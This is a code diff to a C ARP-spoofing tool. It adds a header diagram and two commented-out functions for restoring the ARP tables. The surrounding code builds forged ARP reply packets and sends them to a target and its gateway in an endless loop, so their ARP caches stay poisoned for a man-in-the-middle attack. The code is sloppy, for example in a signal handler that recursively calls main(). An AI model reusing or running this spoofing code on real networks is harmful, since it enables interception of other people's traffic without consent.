@@ -38,12 +38,76 @@ Layer 6
 
 */
 
+/*
+	1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32
+	+-----------------------------------------------------------------------------------+
+	|           HARDWARE TYPE            |               PROTOCOL TYPE                  |
+	+-----------------------------------------------------------------------------------+
+	|     HW-LENGTH   |    PROTO-LEN     |                   OPCODE                     |
+	+-----------------------------------------------------------------------------------+
+	|                     SENDER-HW-ADDR  ______________________________________________|
+	|                                    |                 SENDER-PROTO-ADDR            |
+	+-----------------------------------------------------------------------------------+
+	|                     TARGET-HW-ADDR  ______________________________________________|
+	|                                    |                 TARGET-PROTO-ADDR            |
+	+-----------------------------------------------------------------------------------+
+	 *-PROTO-ADDR are 32 bits but couldnt be fucked fixing it
+
+*/
+
+// void restore_target(unsigned char* buffer) {
+// 	struct ethhdr *ether_header = (struct ethhdr)buffer;
+// 	struct arphdr *arp_header = (struct arphdr)(buffer + sizeof(struct ethhdr));
+
+// 	// First Packet Creation, Will Be Sent to the Target
+// 	memcpy(ether_header->h_source, my_mac, 6);
+// 	memcpy(ether_header->h_dest, target_mac, 6);
+// 	ether_header->h_proto = htons(ARP_PROTOCOL);
+
+// 	arp_header->hw_type = htons(1);
+// 	arp_header->proto_type = htons(IPv4_PROTOCOL);
+// 	arp_header->hw_len = 6;
+// 	arp_header->proto_len = 4;
+// 	arp_header->op = htons(2);
+// 	memcpy(arp_header->sender_hw_addr, target_mac, 6);
+// 	memcpy(arp_header->sender_proto_addr, target_ip, 4);
+// 	memcpy(arp_header->target_hw_addr, router_mac, 6);
+// 	memcpy(arp_header->target_proto_addr, gateway_ip, 4);
+
+
+
+// }
+
+// void restore_gateway(unsigned char* buffer) {
+// 	struct ethhdr *ether_header = (struct ethhdr*)buffer;
+// 	struct arphdr *arp_header = (struct arphdr*)(buffer + sizeof(struct ethhdr));
+
+// 	// First Packet Creation, Will Be Sent to the Target
+// 	memcpy(ether_header->h_source, my_mac, 6);
+// 	memcpy(ether_header->h_dest, target_mac, 6);
+// 	ether_header->h_proto = htons(ARP_PROTOCOL);
+
+// 	arp_header->hw_type = htons(1);
+// 	arp_header->proto_type = htons(IPv4_PROTOCOL);
+// 	arp_header->hw_len = 6;
+// 	arp_header->proto_len = 4;
+// 	arp_header->op = htons(2);
+// 	memcpy(arp_header->sender_hw_addr, router_mac, 6);
+// 	memcpy(arp_header->sender_proto_addr, gateway_ip, 4);
+// 	memcpy(arp_header->target_hw_addr, target_mac, 6);
+// 	memcpy(arp_header->target_proto_addr, target_ip, 4);
+
+
+
+// }
+
 void sig_handle(int sig) {
 	system("clear && clear");
 	close(sockfd);
 	main();
 	
 }
+
 
 void create_target_packet(unsigned char* buffer) {
 	struct ethhdr *ether_header = (struct ethhdr*)buffer;
@@ -123,6 +187,7 @@ int entry(char* ip, char* gateway, char* tMac, char* rMac)
 	**/
 	unsigned char buffer1[ETH_HLEN + sizeof(struct arphdr)];
 	unsigned char buffer2[ETH_HLEN + sizeof(struct arphdr)];
+	//unsigned char restoreBuffer[ETH_HLEN + sizeof(struct arphdr)];
 	
 
 	
@@ -168,18 +233,15 @@ int entry(char* ip, char* gateway, char* tMac, char* rMac)
 	sa2.sll_family = AF_PACKET;
 
 
-
-	create_target_packet(buffer1);
-	create_router_packet(buffer2);
-
+ 
 	
 
-	/**
-		COntinuasly Send the Packets So the ARP Entrys Dont get OverWritten
-	**/
-	int x = 1;
+
+	
+	create_target_packet(buffer1);
+	create_router_packet(buffer2);
 	while(1) {
-		//printf("\r[*] Sent %d Packets", x);
+	//printf("\r[*] Sent %d Packets", x);
 		if(sendto(sockfd, buffer1, sizeof(buffer1), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
 			printf("[-] Error: %s\n", strerror(errno));
 			break;
@@ -190,10 +252,9 @@ int entry(char* ip, char* gateway, char* tMac, char* rMac)
 			break;
 		}
 		usleep(100000);		
-		fflush(stdout);
-		x = x + 1;
+			// fflush(stdout);
+			// x = x + 1;
 	}
-	
 
 
 
